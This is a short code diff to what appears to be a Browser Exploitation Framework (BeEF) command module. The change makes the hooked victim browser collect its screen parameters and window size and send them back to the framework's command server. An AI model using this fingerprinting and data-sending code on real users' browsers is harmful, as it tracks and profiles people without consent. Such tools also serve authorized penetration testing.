@@ -49,8 +49,9 @@ function serialize(_obj)
          break;
 	}
 }
-	
-	var browser_type = serialize(beef.browser.type());
-    
-    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'browser_type='+browser_type);
+
+
+    var screen_params = serialize(beef.browser.getScreenParams());
+    var window_size = serialize(beef.browser.getWindowSize());
+    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'screen_params='+screen_params+'&window_size='+window_size);
 });
